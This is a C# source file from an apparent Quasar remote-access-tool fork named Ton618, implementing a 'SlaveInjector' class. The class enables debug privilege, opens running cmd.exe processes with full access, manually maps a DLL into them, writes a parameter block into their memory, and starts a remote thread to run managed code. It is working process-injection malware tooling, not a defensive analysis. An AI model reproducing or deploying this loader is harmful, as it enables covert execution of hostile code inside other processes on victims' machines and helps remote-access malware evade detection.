using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Ton618.Utilities;
using static Ton618.Utilities.ClientNatives;

namespace Ton618.Loader
{
    internal class SlaveInjector
    {
        public SlaveInjector()
        {
        }
        //void LoadManaged(LPCWSTR dotNetVersion, LPCWSTR szDllLocation, LPCWSTR szMainClass, LPCWSTR szMainMethod, LPCWSTR szParameters)

        private delegate void LoadManaged(
            [MarshalAs(UnmanagedType.LPWStr)] string dotNetVersion,
            [MarshalAs(UnmanagedType.LPWStr)] string szDllLocation,
            [MarshalAs(UnmanagedType.LPWStr)] string szMainClass,
            [MarshalAs(UnmanagedType.LPWStr)] string szMainMethod,
            [MarshalAs(UnmanagedType.LPWStr)] string szParameters
            );

        private delegate void NotifyLoad([MarshalAs(UnmanagedType.LPWStr)] string message);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct ManagedLibraryLoaderParam
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
            public string dotNetVersion;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32768)]
            public string dllLocation;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 1024)]
            public string mainClass;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string mainMethod;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32768)]
            public string parameter;
        }

        public void FindAndInject()
        {
            var bytes = File.ReadAllBytes("Q3C273.Injected.dll");

            var procs = Process.GetProcessesByName("cmd");
            Privileges.EnableDebugPrivilege();

            foreach (var proc in procs)
            {
                var pid = GetProcessId(proc.Handle);
                if (pid == 0)
                    continue;
                //MessageBox.Show("Candidate explorer.exe pid " + pid);
                //
                //var parentp = ParentProcessUtilities.GetParentProcess(pid);
                //
                //if (parentp != null && parentp.ProcessName.Contains("svchost")) // We don't want to inject to an auxiliary explorer processes.
                //    continue;

                var handle = OpenProcess(ProcessAccessRights.PROCESS_ALL_ACCESS, false, pid);

                var loader = new DllLoader(bytes);
                (IntPtr local, IntPtr remote) = loader.Inject(handle);

                var str = new ManagedLibraryLoaderParam
                {
                    dotNetVersion = "v4.0.30319",
                    dllLocation = "D:\\repo\\Quasar\\bin\\Release\\net472\\Q3C273.InjectionTester.dll",
                    mainClass = "Q3C273.InjectionTester.Program",
                    mainMethod = "UglyMethod1",
                    parameter = "HaHaHaHa I'm Here!"
                };
                var strSize = Marshal.SizeOf<ManagedLibraryLoaderParam>();
                var mem = Marshal.AllocHGlobal(strSize);
                Marshal.StructureToPtr(str, mem, false);
                var paramMem = handle.WriteToProcess(mem, (UIntPtr)strSize);
                //var paramMem = VirtualAllocEx(handle, IntPtr.Zero, (UIntPtr)strSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);
                //if (paramMem == IntPtr.Zero)
                //    throw new Exception("Failed to allocate test method param mem.");
                //var written = UIntPtr.Zero;
                //var state = WriteProcessMemory(handle, paramMem, mem, (UIntPtr)strSize, ref written);
                //if (!state || written != (UIntPtr)strSize)
                //    throw new Exception("Failed to write test method param mem.");
                var tid = 0u;
                var funcpos = loader.GetProcAddr(local, "NotifyLoad");
                if (funcpos == IntPtr.Zero)
                    throw new Exception("Specified function not found.");
                var relocFuncPos = funcpos.uminusptr(local).uplusptr(remote); // relocation is important
                var thandle = CreateRemoteThread(handle, IntPtr.Zero, UIntPtr.Zero, relocFuncPos, paramMem, 0, ref tid);
                if (thandle == IntPtr.Zero)
                    throw new Exception("Failed to create test method caller thread.");
                WaitForSingleObject(thandle, 10000);
                CloseHandle(handle);
                break;
            }
        }
    }
}
